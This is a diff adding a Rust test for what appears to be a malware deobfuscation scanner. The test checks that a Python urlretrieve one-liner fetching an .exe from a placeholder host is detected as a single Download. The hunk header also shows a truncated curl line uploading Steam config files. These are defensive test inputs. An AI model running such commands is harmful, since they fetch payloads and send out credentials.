@@ -11774,6 +11774,39 @@ curl --silent --output /dev/null -F steam=@"C:\Program Files (x86)\Steam\config\
     }
 
     #[test]
+    fn python_urllib_urlretrieve_reordered_keyword_args_emit_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import urllib.request; u = 'https://py.example/kw-file.exe'; f = 'kw-file.exe'; urllib.request.urlretrieve(filename=f, url=u)""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/kw-file.exe"
+                        && dst.as_deref() == Some("kw-file.exe")
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python urlretrieve reordered keyword args: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/kw-file.exe")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python urlretrieve reordered keyword args URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn python_urllib_multiline_urlretrieve_alias_emits_structured_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
